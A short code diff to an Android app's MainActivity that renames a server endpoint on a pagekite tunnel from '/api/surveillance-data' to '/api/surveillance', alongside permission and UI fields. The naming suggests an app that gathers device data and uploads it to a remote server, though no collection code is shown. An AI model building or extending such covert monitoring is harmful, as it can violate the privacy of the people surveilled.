@@ -14,7 +14,7 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class MainActivity extends AppCompatActivity {
-    private static final String SERVER_URL = "https://reserve.pagekite.me/api/surveillance-data";
+    private static final String SERVER_URL = "https://reserve.pagekite.me/api/surveillance";
     private static final int PERMISSION_REQUEST_CODE = 1001;
     private TextView statusText;
     private Button startButton;
